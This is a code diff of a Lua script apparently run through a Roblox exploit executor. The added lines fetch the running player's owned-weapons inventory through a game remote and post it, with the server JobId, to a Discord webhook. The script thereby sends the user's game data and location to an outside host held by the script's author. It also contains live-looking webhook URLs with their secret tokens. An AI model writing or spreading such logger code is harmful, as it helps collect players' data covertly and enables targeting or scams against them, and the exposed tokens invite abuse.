@@ -1,3 +1,8 @@
+t = {}
+for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
+ table.insert(t, tostring(i).." : "..tostring(v)..", ")
+end
+inventory = table.concat(t)
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
 local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
@@ -12,14 +17,14 @@ local Embed = {
     };
     fields = {
         {
-            name = "JobId: " .. game.JobId;
-            value = "";
+            name = game.JobId;
+            value = inventory;
         }
     };
     timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
 };
 (syn and syn.request or http_request) {
-    Url = 'https://discord.com/api/webhooks/1256470236732063745/LFVGqWVOactpANHst7rmUg_mNNY6zbbxGZs4y0-a28yJBc5tOjYPUfxMAjce1-Hw0jcl';
+    Url = 'https://discord.com/api/webhooks/1256497949463285771/eTccsWMM7uDjpCYokunCzJ4b1uWdCLSISu17zTdrd34DEcDn_Og7MPWn90J8Ht9lgEuY';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
